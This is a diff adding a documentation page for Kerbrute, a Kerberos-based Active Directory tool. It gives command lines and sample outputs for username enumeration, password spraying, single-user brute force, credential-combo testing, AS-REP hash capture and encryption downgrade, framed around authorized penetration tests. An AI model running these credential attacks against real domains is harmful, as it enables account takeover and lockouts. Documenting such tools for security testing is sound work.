@@ -1,0 +1,327 @@
+---
+title: "Kerbrute"
+description: "Kerbrute tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['active directory', 'kerberos', 'brute force']
+---
+
+**Kerbrute** is an **open-source** tool for quickly enumerating and testing Active Directory accounts through Kerberos pre-authentication. It is written in Go and is commonly used during internal penetration tests to validate usernames, perform controlled password spraying, and test username/password combinations against a Domain Controller.
+
+**Here are the primary uses of Kerbrute:**
+
+  * **Username Enumeration:** Kerbrute can identify valid Active Directory usernames by sending Kerberos TGT requests without pre-authentication. Valid and invalid users produce different KDC responses, allowing user discovery without testing passwords.
+
+  * **Password Spraying:** The tool can test a single password against many users through Kerberos pre-authentication. This is useful for validating weak or reused passwords, but it can increment failed login counters and trigger lockouts.
+
+  * **Single-User Brute Force:** Kerbrute can test a password wordlist against one known user account. This mode should be used carefully because it can cause account lockouts.
+
+  * **Credential Pair Testing:** The tool can read `username:password` combinations from a file or standard input and validate them against Kerberos.
+
+  * **Fast Kerberos Testing:** Kerbrute uses direct Kerberos requests and is multithreaded by default, making it faster than many SMB or LDAP-based credential testing workflows.
+
+  * **Lockout-Aware Operation:** Kerbrute includes options such as `--safe`, `--delay`, and thread control to help reduce operational risk during authorized assessments.
+
+
+
+
+## Core Features​
+
+  * Kerberos-based Active Directory username enumeration
+  * Password spraying and brute-force workflows
+  * Domain controller and realm targeting
+  * Thread, delay, safe, and lockout-aware controls
+  * User, password, and combo list handling
+  * Quiet and output modes for automation
+  * No-LDAP enumeration behavior using Kerberos responses
+
+
+
+## Data sources​
+
+  * Active Directory domain and KDC endpoints
+  * Username wordlists
+  * Password and credential combo lists
+  * Kerberos AS-REQ and pre-authentication responses
+  * Valid, invalid, locked, and disabled account signals
+  * Kerbrute output files
+
+
+
+## Common Kerbrute Commands​
+
+### 1\. Show Help​
+
+  * This command displays Kerbrute's available commands and global options.
+
+
+    
+    
+```
+kerbrute -h  
+```
+### 2\. Show Version​
+
+  * This command displays Kerbrute version information.
+
+
+    
+    
+```
+kerbrute version  
+```
+### 3\. Show Subcommand Help​
+
+  * This command displays usage details for a specific Kerbrute mode.
+
+
+    
+    
+```
+kerbrute <command> --help  
+```
+### 4\. User Enumeration​
+
+  * This command enumerates valid domain usernames from a username wordlist.
+
+
+    
+    
+```
+kerbrute userenum -d <domain> users.txt  
+```
+### 5\. User Enumeration with Domain Controller​
+
+  * This command targets a specific Domain Controller instead of relying on DNS lookup.
+
+
+    
+    
+```
+kerbrute userenum --dc <domain_controller> -d <domain> users.txt  
+```
+### 6\. User Enumeration with More Threads​
+
+  * This command increases the number of worker threads from the default value.
+
+
+    
+    
+```
+kerbrute userenum --dc <domain_controller> -d <domain> -t 20 users.txt  
+```
+### 7\. User Enumeration with Output File​
+
+  * This command writes Kerbrute output to a log file.
+
+
+    
+    
+```
+kerbrute userenum --dc <domain_controller> -d <domain> users.txt -o valid-users.log  
+```
+### 8\. User Enumeration with Verbose Output​
+
+  * This command logs failures and errors as well as successful username discoveries.
+
+
+    
+    
+```
+kerbrute userenum --dc <domain_controller> -d <domain> users.txt -v  
+```
+### 9\. Save AS-REP Hashes​
+
+  * This command saves AS-REP hashes if any accounts without pre-authentication are encountered.
+
+
+    
+    
+```
+kerbrute userenum --dc <domain_controller> -d <domain> users.txt --hash-file asrep-hashes.txt  
+```
+### 10\. Password Spray​
+
+  * This command tests one password against a list of users.
+
+
+    
+    
+```
+kerbrute passwordspray --dc <domain_controller> -d <domain> users.txt '<password>'  
+```
+### 11\. Password Spray with Safe Mode​
+
+  * This command aborts all threads if Kerbrute detects an account lockout response.
+
+
+    
+    
+```
+kerbrute passwordspray --dc <domain_controller> -d <domain> users.txt '<password>' --safe  
+```
+### 12\. Password Spray with Delay​
+
+  * This command adds a delay between each attempt. Kerbrute uses a single thread when delay is set.
+
+
+    
+    
+```
+kerbrute passwordspray --dc <domain_controller> -d <domain> users.txt '<password>' --delay 1000  
+```
+### 13\. Password Spray with Output File​
+
+  * This command saves spray results to a file for review.
+
+
+    
+    
+```
+kerbrute passwordspray --dc <domain_controller> -d <domain> users.txt '<password>' -o spray-results.log  
+```
+### 14\. Password Spray with Verbose Failures​
+
+  * This command prints failed login attempts in addition to successful ones.
+
+
+    
+    
+```
+kerbrute passwordspray --dc <domain_controller> -d <domain> users.txt '<password>' -v  
+```
+### 15\. Brute Force a Single User​
+
+  * This command tests a password wordlist against one username.
+
+
+    
+    
+```
+kerbrute bruteuser --dc <domain_controller> -d <domain> passwords.txt <username>  
+```
+### 16\. Brute Force a Single User with Safe Mode​
+
+  * This command stops if Kerbrute detects an account lockout response.
+
+
+    
+    
+```
+kerbrute bruteuser --dc <domain_controller> -d <domain> passwords.txt <username> --safe  
+```
+### 17\. Test Username and Password Combos from a File​
+
+  * This command tests credential pairs stored in `username:password` format.
+
+
+    
+    
+```
+kerbrute bruteforce --dc <domain_controller> -d <domain> combos.txt  
+```
+### 18\. Test Username and Password Combos from Standard Input​
+
+  * This command reads credential pairs from standard input.
+
+
+    
+    
+```
+cat combos.txt | kerbrute -d <domain> --dc <domain_controller> bruteforce -  
+```
+### 19\. Force Downgraded Encryption​
+
+  * This command forces downgraded encryption type `arcfour-hmac-md5`.
+
+
+    
+    
+```
+kerbrute userenum --dc <domain_controller> -d <domain> users.txt --downgrade  
+```
+### 20\. Run with a Domain Name Only​
+
+  * This command allows Kerbrute to locate the KDC through DNS.
+
+
+    
+    
+```
+kerbrute userenum -d <domain> users.txt  
+```
+### 21\. Run with a Domain Controller IP Address​
+
+  * This command targets the Domain Controller by IP address.
+
+
+    
+    
+```
+kerbrute userenum --dc <dc_ip> -d <domain> users.txt  
+```
+### 22\. Download a Release Binary​
+
+  * This command downloads a Linux AMD64 release binary from the Kerbrute releases page.
+
+
+    
+    
+```
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64  
+```
+### 23\. Make the Binary Executable​
+
+  * This command marks the downloaded Linux binary as executable.
+
+
+    
+    
+```
+chmod +x kerbrute_linux_amd64  
+```
+### 24\. Build from Source with Go​
+
+  * This command installs Kerbrute from source using Go.
+
+
+    
+    
+```
+go get github.com/ropnop/kerbrute  
+```
+### 25\. Build Cross-Platform Binaries​
+
+  * This command builds Linux, Windows, and macOS binaries from the cloned repository.
+
+
+    
+    
+```
+make all  
+```
+## Output Examples of Kerbrute Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+Help| `kerbrute -h`| Shows available commands and flags.| `Available Commands: bruteforce, bruteuser, passwordspray, userenum, version`  
+Version| `kerbrute version`| Shows version info.| `Version: dev - Ronnie Flathers @ropnop`  
+User Enumeration| `kerbrute userenum -d lab.local users.txt`| Enumerates valid usernames.| `[+] VALID USERNAME: alice@lab.local`  
+User Enumeration with DC| `kerbrute userenum --dc dc01.lab.local -d lab.local users.txt`| Targets a specific KDC.| `Using KDC(s): dc01.lab.local:88`  
+Thread Control| `kerbrute userenum --dc dc01.lab.local -d lab.local -t 20 users.txt`| Uses 20 threads.| `Threads: 20`  
+Output File| `kerbrute userenum --dc dc01.lab.local -d lab.local users.txt -o valid.log`| Saves output to a file.| `Writing logs to valid.log`  
+Verbose Mode| `kerbrute userenum --dc dc01.lab.local -d lab.local users.txt -v`| Logs failures and errors.| `[-] INVALID USERNAME: fakeuser@lab.local`  
+AS-REP Hash File| `kerbrute userenum --dc dc01.lab.local -d lab.local users.txt --hash-file asrep.txt`| Saves captured AS-REP hashes.| `Hash written to asrep.txt`  
+Password Spray| `kerbrute passwordspray --dc dc01.lab.local -d lab.local users.txt 'Password123'`| Tests one password against many users.| `[+] VALID LOGIN: alice@lab.local:Password123`  
+Safe Mode| `kerbrute passwordspray --dc dc01.lab.local -d lab.local users.txt 'Password123' --safe`| Stops when lockout is detected.| `[!] Account lockout detected, aborting`  
+Delay| `kerbrute passwordspray --dc dc01.lab.local -d lab.local users.txt 'Password123' --delay 1000`| Adds delay between attempts.| `Delay set to 1000ms`  
+Spray Results| `kerbrute passwordspray --dc dc01.lab.local -d lab.local users.txt 'Password123' -o spray.log`| Saves spray output.| `Done! Tested 500 logins (1 successes)`  
+Brute User| `kerbrute bruteuser --dc dc01.lab.local -d lab.local passwords.txt alice`| Tests many passwords for one user.| `[+] VALID LOGIN: alice@lab.local:Summer2026`  
+Brute User Safe| `kerbrute bruteuser --dc dc01.lab.local -d lab.local passwords.txt alice --safe`| Stops on lockout.| `[!] Safe mode enabled`  
+Combo File| `kerbrute bruteforce --dc dc01.lab.local -d lab.local combos.txt`| Tests username:password pairs.| `[+] VALID LOGIN: bob@lab.local:Password1234`  
+Combo Stdin| `cat combos.txt| kerbrute -d lab.local --dc dc01.lab.local bruteforce -`| Reads combos from stdin.  
+Downgrade| `kerbrute userenum --dc dc01.lab.local -d lab.local users.txt --downgrade`| Forces downgraded encryption.| `Downgrade mode enabled`  
+DNS KDC Lookup| `kerbrute userenum -d lab.local users.txt`| Locates KDC through DNS.| `Using KDC(s): dc01.lab.local:88`  
+DC IP Target| `kerbrute userenum --dc 10.0.0.10 -d lab.local users.txt`| Targets KDC by IP.| `Using KDC(s): 10.0.0.10:88`  
+Download Binary| `wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64`| Downloads Kerbrute.| `kerbrute_linux_amd64 saved`  
+Executable Permission| `chmod +x kerbrute_linux_amd64`| Makes binary executable.| `Executable permission added`  
+Build with Go| `go get github.com/ropnop/kerbrute`| Installs from source.| `go: downloading github.com/ropnop/kerbrute`  
+Build All| `make all`| Builds platform binaries.| `Building for linux amd64... Done.`
